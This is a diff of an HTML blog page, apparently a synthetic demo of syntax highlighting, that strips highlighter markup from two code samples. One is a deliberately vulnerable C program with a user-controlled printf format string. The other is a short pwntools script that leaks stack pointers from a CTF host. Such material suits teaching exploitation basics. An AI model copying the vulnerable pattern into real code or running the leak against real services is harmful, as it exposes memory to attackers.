@@ -52,39 +52,41 @@
   </header>
   <div class="post-content prose">
     <p>A short, synthetic writeup to showcase syntax highlighting for C and Python.</p>
-<h2>Vulnerable snippet ©</h2>
-<pre class="language-c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<h2>Vulnerable snippet (C)</h2>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
 
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter your name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">fgets</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-    name<span class="token punctuation">[</span><span class="token function">strcspn</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>
+int main(void) {
+    char name[64];
+    puts(&quot;Enter your name:&quot;);
+    if (!fgets(name, sizeof(name), stdin)) {
+        return 1;
+    }
+    name[strcspn(name, &quot;\n&quot;)] = '\0';
 
-    <span class="token comment">/* Vulnerable: user-controlled format string */</span>
-    <span class="token function">printf</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span></code></pre>
+    /* Vulnerable: user-controlled format string */
+    printf(name);
+    printf(&quot;\n&quot;);
+    return 0;
+}
+</code></pre>
 <h2>Quick exploit (Python)</h2>
-<pre class="language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> remote
+<pre><code class="language-python">from pwn import remote
 
-io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"example.ctf"</span><span class="token punctuation">,</span> <span class="token number">31337</span><span class="token punctuation">)</span>
+io = remote(&quot;example.ctf&quot;, 31337)
 
-<span class="token comment"># Leak stack values; grab a pointer-like value for a base calc.</span>
-io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"%p %p %p %p %p %p"</span><span class="token punctuation">)</span>
-leak <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>
+# Leak stack values; grab a pointer-like value for a base calc.
+io.sendline(b&quot;%p %p %p %p %p %p&quot;)
+leak = io.recvline().strip().split()
 
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leaks:"</span><span class="token punctuation">,</span> leak<span class="token punctuation">)</span>
+print(&quot;leaks:&quot;, leak)
 
-<span class="token comment"># Example parse: take the 5th leak and compute a fake base.</span>
-ptr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>leak<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
-base <span class="token operator">=</span> ptr <span class="token operator">-</span> <span class="token number">0x1234</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"base:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+# Example parse: take the 5th leak and compute a fake base.
+ptr = int(leak[4], 16)
+base = ptr - 0x1234
+print(&quot;base:&quot;, hex(base))
+</code></pre>
 
   </div>
 </article>
